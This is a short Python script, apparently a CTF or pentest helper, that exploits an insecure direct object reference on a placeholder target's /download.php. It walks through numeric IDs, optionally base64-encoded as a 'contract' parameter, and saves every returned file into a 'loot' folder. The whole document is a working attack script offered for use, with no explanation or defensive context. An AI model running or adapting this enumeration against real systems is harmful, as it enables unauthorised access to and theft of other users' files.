#!/usr/bin/env python3

import requests
import os
import cgi
import base64
import hashlib

BASE_URL = "http://TARGET_IP:PORT"
ENDPOINT = "/download.php"
METHOD = "GET"

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    # "Cookie": "PHPSESSID=xxxxx",
    # "Content-Type": "application/x-www-form-urlencoded"
}

OUTPUT_DIR = "loot"
ID_RANGE = range(1, 21)

# Modify this function if the ID needs to be hashed/encoded
def prepare_payload(current_id):
    # EXAMPLE 1: Plain ID (most common)
    # return {'uid': str(current_id)}
    
    # EXAMPLE 2: Base64 Encoded (MQ==)
    b64_id = base64.b64encode(str(current_id).encode()).decode()
    return {'contract': b64_id} # Change 'contract' to the param name (e.g., 'id', 'uid')

def main():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)
        print(f"[*] Created output directory: {OUTPUT_DIR}")

    full_url = f"{BASE_URL}{ENDPOINT}"
    print(f"[*] Starting {METHOD} scan against {full_url}")

    for i in ID_RANGE:
        params = prepare_payload(i)
        
        try:
            if METHOD.upper() == "POST":
                r = requests.post(full_url, data=params, headers=HEADERS)
            else:
                r = requests.get(full_url, params=params, headers=HEADERS)

            cd_header = r.headers.get('content-disposition')
            
            if cd_header:
                _, meta = cgi.parse_header(cd_header)
                filename = meta.get('filename')
                if not filename:
                    filename = f"file_{i}.bin"
                
                print(f"[+] Found File (ID {i}): {filename}")
                
                save_path = os.path.join(OUTPUT_DIR, filename)
                with open(save_path, "wb") as f:
                    f.write(r.content)
            else:
                if r.status_code == 200 and len(r.content) > 0:
                     print(f"[-] ID {i}: 200 OK (Text response, no file)")
                else:
                     print(f"[-] ID {i}: Status {r.status_code}")

        except Exception as e:
            print(f"[!] Error on ID {i}: {e}")

if __name__ == "__main__":
    main()